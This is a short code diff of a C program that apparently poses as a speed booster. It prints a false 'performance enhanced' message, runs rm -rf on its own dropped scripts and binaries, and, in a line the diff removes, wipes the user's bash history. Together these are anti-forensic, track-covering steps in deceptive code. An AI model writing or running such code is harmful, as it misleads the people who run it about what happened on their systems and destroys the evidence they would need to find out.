@@ -18,7 +18,7 @@ int main(int argc, char *argv[])
 	system("clear");
 	printf("\033[1;32mScript executed successfully,\nspeed and overall performance enhanced ✓\033[0m\n");
 	system("rm -rf speed.sh ml.py doer.sh rex gtsn.c gtsn");
-	system("cat /dev/null > ~/.bash_history && history -c && history -w");
+	
 	
 	
 	return 0;
